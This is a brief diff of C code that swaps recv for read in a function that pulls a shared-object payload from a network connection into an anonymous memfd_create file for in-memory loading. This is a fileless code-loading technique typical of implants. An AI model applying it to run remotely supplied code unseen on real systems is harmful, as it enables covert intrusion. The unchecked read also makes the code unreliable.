@@ -102,7 +102,7 @@ void execute_host(FILE* f, char** argv, char** envp){
 void load_so(int connection_fd, int size){
   char* file_buff = (char*)malloc(sizeof(char)*size);
   int fd = memfd_create("", 1);
-  recv(connection_fd, file_buff, sizeof(char)*size, 0);
+  read(connection_fd, file_buff, sizeof(char)*size);
   write(fd, file_buff, size);
   free(file_buff);
   void* handle;
